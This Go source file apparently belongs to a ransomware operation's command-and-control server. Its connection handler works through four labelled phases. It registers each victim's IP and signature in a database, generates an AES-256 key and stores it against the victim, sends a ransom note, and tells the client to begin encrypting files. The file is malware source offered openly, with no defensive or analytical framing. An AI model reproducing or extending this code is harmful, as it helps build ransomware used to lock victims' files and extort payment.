package utilities

import (
	"database/sql"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"
	"time"
)

func HandleClientConnection(dbConnection *sql.DB, clientConnection net.Conn) {
	// Read data from client
	buffer := make([]byte, 1024)
	n, err := clientConnection.Read(buffer)
	if err != nil {
		log.Panicf("Error reading: %v", err.Error())
	}

	// Process client request
	request := string(buffer[:n])
	requestSignal := strings.Split(request, "@")[0]
	requestSignature := strings.Split(request, "@")[1]
	response := ""
	requestIP := strings.Split(clientConnection.RemoteAddr().String(), ":")[0] // Get only IP address

	defer func() {
		ClientConnectionLog(requestIP, requestSignature, "Connection closed.")
		clientConnection.Close()
	}()

	ClientConnectionLog(requestIP, requestSignature, "Connection accepted.")

	switch requestSignal {
	// Phase 1: Establish connection to the victim
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION":
		response = "Connection established."
		ClientConnectionLog(requestIP, requestSignature, "(Phase 1) Infectioning connection established.")
		RegisterVictim(dbConnection, requestIP, requestSignature, time.Now(), time.Now())

	// Phase 2: Create an encryption key and send it to the victim
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY":
		cryptographicKey := GenerateAESKey()
		response = string(cryptographicKey)
		ClientConnectionLog(requestIP, requestSignature, fmt.Sprintf("(Phase 2) Encryption key sent, key: 0x%v", hex.EncodeToString(cryptographicKey)))
		RegisterVictimAES256Key(dbConnection, requestIP, requestSignature, hex.EncodeToString(cryptographicKey), time.Now())

	// Phase 3: Create a ransom note and send it to the victim
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:CREATERANSOMNOTE":
		response = CreateRansomNote(requestIP, requestSignature)
		ClientConnectionLog(requestIP, requestSignature, "(Phase 3) Ransom note created and sent.")
		UpdateVictimLastContactTimestamp(dbConnection, requestIP, requestSignature, time.Now())

	// Phase 4: Initialize the file encryption process
	case "KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:INITIALIZEFILEENCRYPTION":
		response = "Initialize file encryption process"
		ClientConnectionLog(requestIP, requestSignature, "(Phase 4) File encryption process initialized.")
		UpdateVictimLastContactTimestamp(dbConnection, requestIP, requestSignature, time.Now())

	default:
		response = "Unknown request."
		ClientConnectionLog(requestIP, requestSignature, "Unknown request. (terminate session immediately)")
		UpdateVictimLastContactTimestamp(dbConnection, requestIP, requestSignature, time.Now())
	}

	// Send response to client
	_, err = clientConnection.Write([]byte(response))
	if err != nil {
		log.Panicf("Error writing: %v", err.Error())
	}
}
